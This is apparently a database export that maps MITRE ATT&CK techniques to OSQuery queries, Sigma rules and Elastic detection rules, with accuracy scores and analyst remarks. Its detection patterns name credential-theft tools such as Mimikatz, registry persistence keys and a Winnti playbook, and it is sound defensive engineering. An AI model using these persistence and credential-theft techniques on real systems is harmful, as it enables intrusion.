key='HKEY_CURRENT_USER\\\\Software\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Winlogon';"], "elasticsiem": []}}}}}	2021-07-09 10:20:49.976666+00
150	yes	OSQuery		#800080	Windows Registry	"{'accuracy_score': 70}"	T1546.009	{"extensions": {"x-acds-detection-ext": {"x-os-names": {"windows": {"other": [], "sigma": [], "osquery": ["select name,type,data from registry where key='HKEY_LOCAL_MACHINE\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\Session Manager\\\\AppCertDLLs';"], "elasticsiem": []}}}}}	2021-07-09 10:20:49.976666+00
191	yes	OSQuery	"file_paths": {\n\t  "downloads": [\n\t\t"C:\\\\Users\\\\user\\\\Downloads",\n        "C:\\\\Users\\\\user\\\\Downloads\\\\*",\n\t\t"C:\\\\ProgramData\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\StartUp",\n\t\t"C:\\\\ProgramData\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\StartUp\\\\*"\n      ]\n    }	#800080	File monitoring	"{'accuracy_score': 70}"	T1547.009	{"extensions": {"x-acds-detection-ext": {"x-os-names": {"windows": {"other": [], "sigma": [], "osquery": ["select * FROM ntfs_journal_events;"], "elasticsiem": []}}}}}	2021-07-09 10:20:49.976666+00
146	yes			#FFA500	Process monitoring,File monitoring,Process commandline parameters	"{'accuracy_score': 20}"	T1569.001	{"extensions": {"x-acds-detection-ext": {"x-os-names": {"windows": {"other": ["KnockKnock can be used to detect persistent programs such as those installed via launchctl as launch agents or launch daemons."], "sigma": [], "osquery": ["select * from file_events;", "select * from processes where parent like '%launch%';"], "elasticsiem": []}}}}}	2021-07-09 10:20:49.976666+00
163	yes	OSQuery		#FFA500	Authentication logs	"{'accuracy_score': 30}"	T1021.004	{"extensions": {"x-acds-detection-ext": {"x-os-names": {"linux": {"other": [], "sigma": [], "osquery": ["select * from users;", "select datetime(time,'unixepoch','UTC') as time_utc,host,user,tty,pid,type from logged_in_users;"], "elasticsiem": []}}}}}	2021-07-09 10:20:49.976666+00
169	no	OSQuery	["1. Find/Explore fameworks/tools to detect windows API usage for tokens DuplicateToken(Ex) and CreateProcessWithTokenW."]	#8ddd25	Process monitoring	"{'accuracy_score': 0}"	T1134.002	{"extensions": {"x-acds-detection-ext": {"x-os-names": {"windows": {"other": [], "sigma": [], "osquery": ["select * from file WHERE directory = 'C:\\\\\\\\Windows\\\\\\\\Prefetch\\\\\\\\' and filename like '%runas%';"], "elasticsiem": []}}}}}	2021-07-09 10:20:49.976666+00
176	no	OSQuery		#FFFFFF	Process monitoring	"{'accuracy_score': 0}"	T1216	{"extensions": {"x-acds-detection-ext": {"x-os-names": {"windows": {"other": [], "sigma": [], "osquery": ["select * from file WHERE directory = 'C:\\\\\\\\Windows\\\\\\\\Prefetch\\\\\\\\' and filename like '%cscript%';"], "elasticsiem": []}}}}}	2021-07-09 10:20:49.976666+00
175	yes	OSQuery	The query monitors the windows registry key. Accordingly data source needs to be updated. This registry key is used by MuddyWater to hide behind legitimate windows defender process.	#FFA500	Process monitoring,File monitoring	"{'accuracy_score': 30}"	T1036.005	{"extensions": {"x-acds-detection-ext": {"x-os-names": {"windows": {"other": [], "sigma": [], "osquery": ["select name,type,data from registry where key LIKE 'HKEY_USERS\\\\\\\\%\\\\\\\\Software\\\\\\\\Microsoft\\\\\\\\Windows\\\\\\\\CurrentVersion\\\\\\\\Run' and name='WindowsDefenderUpdater';", "select * from file_events;"], "elasticsiem": []}}}}}	2021-07-09 10:20:49.976666+00
170	yes	OSQuery		#FFA500	Process monitoring	"{'accuracy_score': 20}"	T1574.002	{"extensions": {"x-acds-detection-ext": {"x-os-names": {"windows": {"other": [], "sigma": [], "osquery": ["select DISTINCT(pm.path), p.pid, p.name from processes p JOIN process_memory_map pm ON p.pid=pm.pid;"], "elasticsiem": []}}}}}	2021-07-09 10:20:49.976666+00
167	yes	yaml	["For Detection Follow below steps:\nConfigured Winlogbeat for codeintegrity events:\n- name: Microsoft-Windows-CodeIntegrity/Operational\n    event_id: 3065,3066,3033,3063\n\nFor Elastaalert:\n1. Convert the win_violated_code_integrity_policy.yml into elastalert query using uncoder.io.\n2. Create and copy the elastaert query in docker's elastalaert rules folder.\n\nSteps to enable audit mode for Lsass.exe:\nRun below command :\n\nreg add ""HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\LSASS.exe"" /v AuditLevel /t REG_DWORD /d 00000008 /f\n\nOR\n1. Open the Registry Editor (RegEdit.exe), and navigate to the registry key that is located at: HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\LSASS.exe.\n2. Set the value of the registry key to AuditLevel=dword:00000008.\n\nRestart the computer.\nAnalyze the results of event 3065 and event 3066."]	#008000	Windows Registry	"{'accuracy_score': 90}"	T1547.008	{"extensions": {"x-acds-detection-ext": {"x-os-names": {"windows": {"other": [], "sigma": [{"rule": "win_violated_code_integrity_policy.yml", "elastalert": ""}], "osquery": [], "elasticsiem": []}}}}}	2021-07-09 10:20:49.976666+00
178	no	OSQuery		#FFFFFF	File monitoring	"{'accuracy_score': 0}"	T1070.006	{"extensions": {"x-acds-detection-ext": {"x-os-names": {"windows": {"other": [], "sigma": [], "osquery": ["select * from file_events;"], "elasticsiem": []}}}}}	2021-07-09 10:20:49.976666+00
180	no	OSQuery	Need to provide file paths to monitor. setuid and setgid bits can be queried from mode column.	#FFFFFF	File monitoring	"{'accuracy_score': 0}"	T1548.001	{"extensions": {"x-acds-detection-ext": {"x-os-names": {"windows": {"other": [], "sigma": [], "osquery": ["select * from file where path like '/tmp/%' and mode like '4%' or mode like '6%';", "select * from file_events where mode like '4%' or mode like '6%';"], "elasticsiem": []}}}}}	2021-07-09 10:20:49.976666+00
182	no	OSQuery	["1. Couldn't find much DLLs which can use native API and then execute payload.", "2. Couldn't find much on Detection of DLL module loads.", "3. We can do file monitoring for directories %ProgramFiles%, %SystemRoot%"]	#FFFFFF	File monitoring	"{'accuracy_score': 0}"	T1129	{"extensions": {"x-acds-detection-ext": {"x-os-names": {"windows": {"other": [], "sigma": [], "osquery": ["select * from file_events;"], "elasticsiem": []}}}}}	2021-07-09 10:20:49.976666+00
186	no	OSQuery		#FFFFFF	Process monitoring,Process monitoring,Process commandline parameters	"{'accuracy_score': 0}"	T1057	{"extensions": {"x-acds-detection-ext": {"x-os-names": {"windows": {"other": [], "sigma": [], "osquery": ["select * from file WHERE directory = 'C:\\\\\\\\Windows\\\\\\\\Prefetch\\\\\\\\' and filename like '%tasklist%';", "select pr.pid, pr.name, usr.username, pr.path, pr.cmdline from processes pr LEFT JOIN users usr ON pr.uid = usr.uid WHERE pr.cmdline != '';"], "elasticsiem": []}}}}}	2021-07-09 10:20:49.976666+00
197	yes	OSQuery	Turn on powershell script block logging.	#008000	PowerShell logs,Process monitoring,Process commandline parameters,Process monitoring	"{'accuracy_score': 90}"	T1003.001	{"extensions": {"x-acds-detection-ext": {"x-os-names": {"windows": {"other": [], "sigma": [], "osquery": ["select * from powershell_events;", "select * from file WHERE directory = 'C:\\\\\\\\Windows\\\\\\\\Prefetch\\\\\\\\' and filename like '%mimikatz%';", "select * from powershell_events where script_text like '%Invoke-Mimikatz%';"], "elasticsiem": []}}}}}	2021-07-09 10:20:49.976666+00
193	yes	OSQuery	ART's mavinject can be detected.\nRootkit detector - http://www.gmer.net/ need to be explored	#800080	Loaded DLLs	"{'accuracy_score': 50}"	T1056.004	{"extensions": {"x-acds-detection-ext": {"x-os-names": {"windows": {"other": [], "sigma": [], "osquery": ["select * from powershell_events where script_text like '%Invoke-WebRequest%';", "select * from powershell_events where script_text like '%mavinject%';"], "elasticsiem": []}}}}}	2021-07-09 10:20:49.976666+00
199	no	OSQuery		#FFFFFF	File monitoring	"{'accuracy_score': 0}"	T1056.001	{"extensions": {"x-acds-detection-ext": {"x-os-names": {"windows": {"other": [], "sigma": [], "osquery": ["select * from file_events;"], "elasticsiem": []}}}}}	2021-07-09 10:20:49.976666+00
200	no	other	MacOS Dependency	#FFFFFF	Process monitoring,File monitoring	"{'accuracy_score': 0}"	T1543.001	{"extensions": {"x-acds-detection-ext": {"x-os-names": {"windows": {"other": ["[\\"Monitor Launch Agent creation through additional plist files and utilities such as Objective-Sees KnockKnock application. Launch Agents also require files on disk for persistence which can also be monitored via other file monitoring applications.\\"]"], "sigma": [], "osquery": [], "elasticsiem": []}}}}}	2021-07-09 10:20:49.976666+00
188	no	other		#FFFFFF	Authentication logs,Windows event logs	"{'accuracy_score': 0}"	T1098	{"extensions": {"x-acds-detection-ext": {"x-os-names": {"windows": {"other": ["Collect Events that correlate with chnages to account objects and/or permissions on systems and the domain, such event Ids - 4738,4728,467. Monitor for unusual permission changes that may indicate excessively broad permissions being granted"], "sigma": [], "osquery": [], "elasticsiem": []}}}}}	2021-07-09 10:20:49.976666+00
190	no	OSQuery		#FFFFFF	Process monitoring,Process monitoring,Process commandline parameters	"{'accuracy_score': 0}"	T1140	{"extensions": {"x-acds-detection-ext": {"x-os-names": {"windows": {"other": [], "sigma": [], "osquery": ["select * from file WHERE directory = 'C:\\\\\\\\Windows\\\\\\\\Prefetch\\\\\\\\' and filename like '%certutil%';", "\\"select pr.pid, pr.name, usr.username, pr.path, pr.cmdline from processes pr LEFT JOIN users usr ON pr.uid = usr.uid WHERE pr.cmdline != '';\\""], "elasticsiem": []}}}}}	2021-07-09 10:20:49.976666+00
195	yes	yaml		#FFA500	Windows Registry,Services	"{'accuracy_score': 20}"	T1574.011	{"extensions": {"x-acds-detection-ext": {"x-os-names": {"windows": {"other": [], "sigma": [{"rule": "sysmon_possible_privilege_escalation_via_service_registry_permissions_weakness.yml", "elastalert": ""}, {"rule": "win_using_sc_to_change_sevice_image_path_by_non_admin.yml", "elastalert": ""}], "osquery": [], "elasticsiem": []}}}}}	2021-07-09 10:20:49.976666+00
453	yes	other	\N	#800080	Process monitoring	{"accuracy_score": 70}	T1055.012	{"extensions": {"x-acds-detection-ext": {"x-os-names": {"windows": {"other": [], "sigma": [], "osquery": [], "elasticsiem": ["process where event.type in (\\"start\\", \\"process_started\\") and\\n     process.parent.name : \\"svchost.exe\\" and\\n\\n     /* based on svchost service arguments -s svcname where the service is known to be childless */\\n\\n    process.parent.args : (\\"WdiSystemHost\\",\\"LicenseManager\\",\\n      \\"StorSvc\\",\\"CDPSvc\\",\\"cdbhsvc\\",\\"BthAvctpSvc\\",\\"SstpSvc\\",\\"WdiServiceHost\\",\\n      \\"imgsvc\\",\\"TrkWks\\",\\"WpnService\\",\\"IKEEXT\\",\\"PolicyAgent\\",\\"CryptSvc\\",\\n      \\"netprofm\\",\\"ProfSvc\\",\\"StateRepository\\",\\"camsvc\\",\\"LanmanWorkstation\\",\\n      \\"NlaSvc\\",\\"EventLog\\",\\"hidserv\\",\\"DisplayEnhancementService\\",\\"ShellHWDetection\\",\\n      \\"AppHostSvc\\",\\"fhsvc\\",\\"CscService\\",\\"PushToInstall\\") and\\n\\n      /* unknown FPs can be added here */\\n\\n     not process.name : (\\"WerFault.exe\\",\\"WerFaultSecure.exe\\",\\"wermgr.exe\\")\\n", "process where event.type in (\\"start\\", \\"process_started\\") and\\nprocess.parent.name != null and\\n (\\n   /* suspicious parent processes */\\n   (process.name:\\"autochk.exe\\" and not process.parent.name:\\"smss.exe\\") or\\n   (process.name:(\\"fontdrvhost.exe\\", \\"dwm.exe\\") and not process.parent.name:(\\"wininit.exe\\", \\"winlogon.exe\\")) or\\n   (process.name:(\\"consent.exe\\", \\"RuntimeBroker.exe\\", \\"TiWorker.exe\\") and not process.parent.name:\\"svchost.exe\\") or\\n   (process.name:\\"SearchIndexer.exe\\" and not process.parent.name:\\"services.exe\\") or\\n   (process.name:\\"SearchProtocolHost.exe\\" and not process.parent.name:(\\"SearchIndexer.exe\\", \\"dllhost.exe\\")) or\\n   (process.name:\\"dllhost.exe\\" and not process.parent.name:(\\"services.exe\\", \\"svchost.exe\\")) or\\n   (process.name:\\"smss.exe\\" and not process.parent.name:(\\"System\\", \\"smss.exe\\")) or\\n   (process.name:\\"csrss.exe\\" and not process.parent.name:(\\"smss.exe\\", \\"svchost.exe\\")) or\\n   (process.name:\\"wininit.exe\\" and not process.parent.name:\\"smss.exe\\") or\\n   (process.name:\\"winlogon.exe\\" and not process.parent.name:\\"smss.exe\\") or\\n   (process.name:(\\"lsass.exe\\", \\"LsaIso.exe\\") and not process.parent.name:\\"wininit.exe\\") or\\n   (process.name:\\"LogonUI.exe\\" and not process.parent.name:(\\"wininit.exe\\", \\"winlogon.exe\\")) or\\n   (process.name:\\"services.exe\\" and not process.parent.name:\\"wininit.exe\\") or\\n   (process.name:\\"svchost.exe\\" and not process.parent.name:(\\"MsMpEng.exe\\", \\"services.exe\\")) or\\n   (process.name:\\"spoolsv.exe\\" and not process.parent.name:\\"services.exe\\") or\\n   (process.name:\\"taskhost.exe\\" and not process.parent.name:(\\"services.exe\\", \\"svchost.exe\\")) or\\n   (process.name:\\"taskhostw.exe\\" and not process.parent.name:(\\"services.exe\\", \\"svchost.exe\\")) or\\n   (process.name:\\"userinit.exe\\" and not process.parent.name:(\\"dwm.exe\\", \\"winlogon.exe\\")) or\\n   (process.name:(\\"wmiprvse.exe\\", \\"wsmprovhost.exe\\", \\"winrshost.exe\\") and not process.parent.name:\\"svchost.exe\\") or\\n   /* suspicious child processes */\\n   (process.parent.name:(\\"SearchProtocolHost.exe\\", \\"taskhost.exe\\", \\"csrss.exe\\") and not process.name:(\\"werfault.exe\\", \\"wermgr.exe\\", \\"WerFaultSecure.exe\\")) or\\n   (process.parent.name:\\"autochk.exe\\" and not process.name:(\\"chkdsk.exe\\", \\"doskey.exe\\", \\"WerFault.exe\\")) or\\n   (process.parent.name:\\"smss.exe\\" and not process.name:(\\"autochk.exe\\", \\"smss.exe\\", \\"csrss.exe\\", \\"wininit.exe\\", \\"winlogon.exe\\", \\"setupcl.exe\\", \\"WerFault.exe\\")) or\\n   (process.parent.name:\\"wermgr.exe\\" and not process.name:(\\"WerFaultSecure.exe\\", \\"wermgr.exe\\", \\"WerFault.exe\\")) or\\n   (process.parent.name:\\"conhost.exe\\" and not process.name:(\\"mscorsvw.exe\\", \\"wermgr.exe\\", \\"WerFault.exe\\", \\"WerFaultSecure.exe\\"))\\n  )\\n"]}}}}}	2021-07-09 10:20:49.976666+00
151	yes	OSQuery		#008000	Windows Registry	"{'accuracy_score': 90}"	T1547.004	{"extensions": {"x-acds-detection-ext": {"x-os-names": {"windows": {"other": [], "sigma": [], "osquery": ["select name, type, data from registry where key='HKEY_LOCAL_MACHINE\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Winlogon';"], "elasticsiem": []}}}}}	2021-07-09 10:20:49.976666+00
164	yes	OSQuery	"file_paths": { "downloads": ["/etc/ssh/*" ] }	#800080	File monitoring	"{'accuracy_score': 50}"	T1098.004	{"extensions": {"x-acds-detection-ext": {"x-os-names": {"windows": {"other": [], "sigma": [], "osquery": ["select * from file_events;"], "elasticsiem": []}}}}}	2021-07-09 10:20:49.976666+00
64	yes	OSQuery	["1. macOS attack/detection not tried. Will need mac machine to try."]	#FFA500	Process monitoring	"{'accuracy_score': 20}"	T1059.002	{"extensions": {"x-acds-detection-ext": {"x-os-names": {"windows": {"other": [], "sigma": [], "osquery": ["SELECT * FROM apps where oascript_enabled != '0';"], "elasticsiem": []}}}}}	2021-07-09 10:20:49.976666+00
159	yes	yaml		#800080	WMI Objects	"{'accuracy_score': 70}"	T1546.003	{"extensions": {"x-acds-detection-ext": {"x-os-names": {"windows": {"other": [], "sigma": [{"rule": "sysmon_wmi_event_subscription.yml", "elastalert": ""}, {"rule": "win_wmi_backdoor_exchange_transport_agent.yml", "elastalert": ""}, {"rule": "win_wmi_persistence_script_event_consumer.yml", "elastalert": ""}, {"rule": "sysmon_wmi_persistence_script_event_consumer_write.yml", "elastalert": ""}, {"rule": "sysmon_wmi_persistence_commandline_event_consumer.yml", "elastalert": ""}], "osquery": [], "elasticsiem": []}}}}}	2021-07-09 10:20:49.976666+00
14	yes	yaml		#800080	File monitoring	"{'accuracy_score': 70}"	T1546.013	{"extensions": {"x-acds-detection-ext": {"x-os-names": {"windows": {"other": [], "sigma": [{"rule": "powershell_suspicious_profile_create.yml", "elastalert": ""}], "osquery": [], "elasticsiem": []}}}}}	2021-07-09 10:20:49.976666+00
194	yes			#FFA500	Loaded DLLs,API monitoring,Process monitoring	{"accuracy_score": 10}	T1106	{"extensions": {"x-acds-detection-ext": {"x-os-names": {"windows": {"other": [], "sigma": [{"rule": "win_redmimicry_winnti_proc.yml", "elastalert": {"name": "redmimicry_winnti_playbook_execute_0", "type": "any", "alert": ["debug"], "index": "bhd10944_searchnode:so-*", "filter": [{"query_string": {"query": "(process.args:(*gthread-3.6.dll* OR *\\\\Windows\\\\Temp\\\\tmp.bat* OR *sigcmm-2.4.dll*) AND process.executable:(*rundll32.exe* OR *cmd.exe*))"}}], "realert": {"minutes": 0}, "priority": 2, "description": "Detects actions caused by the RedMimicry Winnti playbook"}}], "osquery": [], "elasticsiem": []}}}}}	2021-07-19 11:49:38.603845+00
103	yes	yaml	["For Detection Follow below steps:\nConfigured Winlogbeat for codeintegrity events:\n- name: Microsoft-Windows-CodeIntegrity/Operational\n    event_id: 3065,3066,3033,3063\n\nFor Elastaalert:\n1. Convert the win_violated_code_integrity_policy.yml into elastalert query using uncoder.io.\n2. Create and copy the elastaert query in docker's elastalaert rules folder.\n\nSteps to enable audit mode for Lsass.exe:\nRun below command :\n\nreg add ""HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\LSASS.exe"" /v AuditLevel /t REG_DWORD /d 00000008 /f\n\nOR\n1. Open the Registry Editor (RegEdit.exe), and navigate to the registry key that is located at: HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\LSASS.exe.\n2. Set the value of the registry key to AuditLevel=dword:00000008.\n\nRestart the computer.\nAnalyze the results of event 3065 and event 3066."]	#008000	Windows Registry	"{'accuracy_score': 90}"	T1547.005	{"extensions": {"x-acds-detection-ext": {"x-os-names": {"windows": {"other": [], "sigma": [{"rule": "win_violated_code_integrity_policy.yml", "elastalert": ""}], "osquery": [], "elasticsiem": []}}}}}	2021-07-09 10:20:49.976666+00
173	yes	OSQuery	Process Monitoring.\nQuery checks registry path for all users on system.	#008000	Windows Registry	"{'accuracy_score': 90}"	T1547.001	{"extensions": {"x-acds-detection-ext": {"x-os-names": {"windows": {"other": [], "sigma": [], "osquery": ["select name,type,data from registry where key='HKEY_LOCAL_MACHINE\\\\\\\\Software\\\\\\\\Microsoft\\\\\\\\Windows\\\\\\\\CurrentVersion\\\\\\\\RunOnceEx\\\\\\\\0001';", "select name,type,data from registry where key='HKEY_CURRENT_USER\\\\\\\\Software\\\\\\\\Microsoft\\\\\\\\Windows\\\\\\\\CurrentVersion\\\\\\\\RunServices';", "select name,type,data from registry where key LIKE 'HKEY_USERS\\\\\\\\%\\\\\\\\Software\\\\\\\\Microsoft\\\\\\\\Windows\\\\\\\\CurrentVersion\\\\\\\\Run' and name='SystemTextEncoding';", "select name,type,data from registry where key='HKEY_CURRENT_USER\\\\\\\\Software\\\\\\\\Microsoft\\\\\\\\Windows\\\\\\\\CurrentVersion\\\\\\\\RunOnce';", "select name,type,data from registry where key='HKEY_CURRENT_USER\\\\\\\\Software\\\\\\\\Microsoft\\\\\\\\Windows\\\\\\\\CurrentVersion\\\\\\\\Run';", "select * from file WHERE directory = 'C:\\\\Windows\\\\Prefetch\\\\' and filename like '%reg.exe%';", "select name,type,data from registry where key='HKEY_LOCAL_MACHINE\\\\\\\\Software\\\\\\\\Microsoft\\\\\\\\Windows\\\\\\\\CurrentVersion\\\\\\\\RunOnce';", "select name,type,data from registry where key='HKEY_LOCAL_MACHINE\\\\\\\\Software\\\\\\\\Microsoft\\\\\\\\Windows\\\\\\\\CurrentVersion\\\\\\\\RunServices';", "select name,type,data from registry where key LIKE 'HKEY_USERS\\\\%\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run' and name='SystemTextEncoding';", "select name,type,data from registry where key LIKE 'HKEY_USERS\\\\\\\\%\\\\\\\\Software\\\\\\\\Microsoft\\\\\\\\Windows\\\\\\\\CurrentVersion\\\\\\\\RunServices';", "select name,type,data from registry where key='HKEY_LOCAL_MACHINE\\\\\\\\Software\\\\\\\\Microsoft\\\\\\\\Windows\\\\\\\\CurrentVersion\\\\\\\\RunServicesOnce';", "select name,type,data from registry where key='HKEY_LOCAL_MACHINE\\\\\\\\Software\\\\\\\\Microsoft\\\\\\\\Windows\\\\\\\\CurrentVersion\\\\\\\\RunOnceEx\\\\\\\\0001\\\\\\\\Depend';", "select name,type,data from registry where key LIKE 'HKEY_USERS\\\\\\\\%\\\\\\\\Software\\\\\\\\Microsoft\\\\\\\\Windows\\\\\\\\CurrentVersion\\\\\\\\RunServicesOnce';", "select name,type,data from registry where key LIKE 'HKEY_USERS\\\\\\\\%\\\\\\\\Software\\\\\\\\Microsoft\\\\\\\\Windows\\\\\\\\CurrentVersion\\\\Run';", "select name,type,data from registry where key='HKEY_LOCAL_MACHINE\\\\\\\\Software\\\\\\\\Microsoft\\\\\\\\Windows\\\\\\\\CurrentVersion\\\\\\\\Run';", "select name,type,data from registry where key='HKEY_LOCAL_MACHINE\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\RunOnceEx\\\\0001';"], "elasticsiem": ["registry where \\n winlog.event_data.Details != null and process.name : \\"WmiPrvSe.exe\\" and\\n registry.path : (\\n                  \\"HKEY_USERS\\\\\\\\*\\\\\\\\Software\\\\\\\\Microsoft\\\\\\\\Windows\\\\\\\\CurrentVersion\\\\\\\\Run\\\\\\\\*\\",\\n                  \\"HKLM\\\\\\\\Software\\\\\\\\Microsoft\\\\\\\\Windows\\\\\\\\CurrentVersion\\\\\\\\Run\\\\\\\\*\\",\\n                  \\"HKLM\\\\\\\\Software\\\\\\\\WOW6432Node\\\\\\\\Microsoft\\\\\\\\Windows\\\\\\\\CurrentVersion\\\\\\\\Run\\\\\\\\*\\",\\n                  \\"HKEY_USERS\\\\\\\\*\\\\\\\\Software\\\\\\\\Microsoft\\\\\\\\Windows\\\\\\\\CurrentVersion\\\\\\\\Policies\\\\\\\\Explorer\\\\\\\\Run\\\\\\\\*\\",\\n                  \\"HKLM\\\\\\\\Software\\\\\\\\Microsoft\\\\\\\\Windows\\\\\\\\CurrentVersion\\\\\\\\Policies\\\\\\\\Explorer\\\\\\\\Run\\\\\\\\*\\",\\n                  \\"HKLM\\\\\\\\Software\\\\\\\\Microsoft\\\\\\\\Windows\\\\\\\\CurrentVersion\\\\\\\\RunOnce\\\\\\\\*\\",\\n                  \\"HKLM\\\\\\\\Software\\\\\\\\Microsoft\\\\\\\\Windows\\\\\\\\CurrentVersion\\\\\\\\RunOnceEx\\\\\\\\*\\",\\n                  \\"HKEY_USERS\\\\\\\\*\\\\\\\\Software\\\\\\\\Microsoft\\\\\\\\Windows\\\\\\\\CurrentVersion\\\\\\\\RunOnce\\\\\\\\*\\",\\n                  \\"HKEY_USERS\\\\\\\\*\\\\\\\\Software\\\\\\\\Microsoft\\\\\\\\Windows\\\\\\\\CurrentVersion\\\\\\\\RunOnceEx\\\\\\\\*\\",\\n                  \\"HKLM\\\\\\\\SYSTEM\\\\\\\\*ControlSet*\\\\\\\\Services\\\\\\\\*\\\\\\\\ServiceDLL\\",\\n                  \\"HKLM\\\\\\\\SYSTEM\\\\\\\\*ControlSet*\\\\\\\\Services\\\\\\\\*\\\\\\\\ImagePath\\",\\n                  \\"HKEY_USERS\\\\\\\\*\\\\\\\\Software\\\\\\\\Microsoft\\\\\\\\Windows NT\\\\\\\\CurrentVersion\\\\\\\\Winlogon\\\\\\\\Shell\\\\\\\\*\\", \\n                  \\"HKEY_USERS\\\\\\\\*\\\\\\\\Environment\\\\\\\\UserInitMprLogonScript\\", \\n                  \\"HKEY_USERS\\\\\\\\*\\\\\\\\SOFTWARE\\\\\\\\Microsoft\\\\\\\\Windows NT\\\\\\\\CurrentVersion\\\\\\\\Windows\\\\\\\\Load\\", \\n                  \\"HKEY_USERS\\\\\\\\*\\\\\\\\SOFTWARE\\\\\\\\Microsoft\\\\\\\\Windows NT\\\\\\\\CurrentVersion\\\\\\\\Winlogon\\\\\\\\Shell\\", \\n                  \\"HKEY_USERS\\\\\\\\*\\\\\\\\SOFTWARE\\\\\\\\Microsoft\\\\\\\\Windows\\\\\\\\CurrentVersion\\\\\\\\Policies\\\\\\\\System\\\\\\\\Shell\\", \\n                  \\"HKEY_USERS\\\\\\\\*\\\\\\\\SOFTWARE\\\\\\\\Policies\\\\\\\\Microsoft\\\\\\\\Windows\\\\\\\\System\\\\\\\\Scripts\\\\\\\\Logoff\\\\\\\\Script\\", \\n                  \\"HKEY_USERS\\\\\\\\*\\\\\\\\SOFTWARE\\\\\\\\Policies\\\\\\\\Microsoft\\\\\\\\Windows\\\\\\\\System\\\\\\\\Scripts\\\\\\\\Logon\\\\\\\\Script\\", \\n                  \\"HKEY_USERS\\\\\\\\*\\\\\\\\SOFTWARE\\\\\\\\Policies\\\\\\\\Microsoft\\\\\\\\Windows\\\\\\\\System\\\\\\\\Scripts\\\\\\\\Shutdown\\\\\\\\Script\\", \\n                  \\"HKEY_USERS\\\\\\\\*\\\\\\\\SOFTWARE\\\\\\\\Policies\\\\\\\\Microsoft\\\\\\\\Windows\\\\\\\\System\\\\\\\\Scripts\\\\\\\\Startup\\\\\\\\Script\\", \\n                  \\"HKEY_USERS\\\\\\\\*\\\\\\\\SOFTWARE\\\\\\\\Microsoft\\\\\\\\Ctf\\\\\\\\LangBarAddin\\\\\\\\*\\\\\\\\FilePath\\", \\n                  \\"HKEY_USERS\\\\\\\\*\\\\\\\\SOFTWARE\\\\\\\\Microsoft\\\\\\\\Internet Explorer\\\\\\\\Extensions\\\\\\\\*\\\\\\\\Exec\\", \\n                  \\"HKEY_USERS\\\\\\\\*\\\\\\\\SOFTWARE\\\\\\\\Microsoft\\\\\\\\Internet Explorer\\\\\\\\Extensions\\\\\\\\*\\\\\\\\Script\\", \\n                  \\"HKEY_USERS\\\\\\\\*\\\\\\\\SOFTWARE\\\\\\\\Microsoft\\\\\\\\Command Processor\\\\\\\\Autorun\\"\\n                  )"]}}}}}	2021-07-09 10:20:49.976666+00
166	yes	other,yaml	["1. usb_devices query table is only available for linux."]	#800080	Data loss prevention,Asset management,Asset management,File monitoring	{"accuracy_score": 50}	T1200	{"extensions": {"x-acds-detection-ext": {"x-os-names": {"windows": {"other": ["[\\"1. Asset management systems will help detection of systems or network devices that shouldn't exist in the network.\\", \\"2. Endpoint sensors help detect addition of hardware via USB, Thunderbolt, and other external devices communiaction ports.\\", \\"select * from usb_devices;\\"]"], "sigma": [{"rule": "win_usb_device_plugged.yml", "elastalert": ""}, {"rule": "win_external_device.yml", "elastalert": ""}], "osquery": [], "elasticsiem": []}}}}}	2021-07-09 10:20:49.976666+00
131	yes	other	["1. Couldn't find how to monitor processes which are using COM objects.", "One reference was found where it is described for ways of doing it, https://www.fireeye.com/blog/threat-research/2019/06/hunting-com-objects.html"]	#800080	Process monitoring	"{'accuracy_score': 60}"	T1559.001	{"extensions": {"x-acds-detection-ext": {"x-os-names": {"windows": {"other": ["[\\"1. Monitor for spawning of processes associated with COM objects, especially those invoked by a user different than the one currently logged on.\\"]"], "sigma": [], "osquery": [], "elasticsiem": ["process where event.type in (\\"start\\", \\"process_started\\") and\\n process.pe.original_file_name : \\"xwizard.exe\\" and\\n (\\n   (process.args : \\"RunWizard\\" and process.args : \\"{*}\\") or\\n   (process.executable != null and\\n     not process.executable : (\\"C:\\\\\\\\Windows\\\\\\\\SysWOW64\\\\\\\\xwizard.exe\\", \\"C:\\\\\\\\Windows\\\\\\\\System32\\\\\\\\xwizard.exe\\")\\n   )\\n )\\n"]}}}}}	2021-07-09 10:20:49.976666+00
1	no	other	Unable to verify the detection since it has dependency on outlook.	#FFFFFF	Mail server	"{'accuracy_score': 0}"	T1137.003	{"extensions": {"x-acds-detection-ext": {"x-os-names": {"windows": {"other": ["[1. \\"https://docs.microsoft.com/en-us/microsoft-365/security/office-365-security/detect-and-remediate-outlook-rules-forms-attack?view=o365-worldwide\\n2. https://github.com/sensepost/notruler\\"]"], "sigma": [], "osquery": [], "elasticsiem": []}}}}}	2021-07-09 10:20:49.976666+00
108	yes	OSQuery,other	["1. Need to track script execution enablement events."]	#FFA500	File monitoring,Process monitoring,Process commandline parameters	"{'accuracy_score': 20}"	T1059.004	{"extensions": {"x-acds-detection-ext": {"x-os-names": {"windows": {"other": ["[\\"If scripting is restricted for normal users, then any attempt to enable scripts running on a system would be considered suspicious. If scripts are not commonly used on a system, but enabled, scripts running out of cycle from patching or other administrator functions are suspicious.\\"]", "select usr.username, sht.command, sht.history_file from shell_history sht JOIN users usr ON sht.uid = usr.uid WHERE sht.uid IN (SELECT uid from users);"], "sigma": [], "osquery": ["select * from file_events;", "select pr.pid, pr.name, usr.username, pr.path, pr.cmdline from processes pr LEFT JOIN users usr ON pr.uid = usr.uid WHERE pr.cmdline != '';"], "elasticsiem": []}}}}}	2021-07-09 10:20:49.976666+00
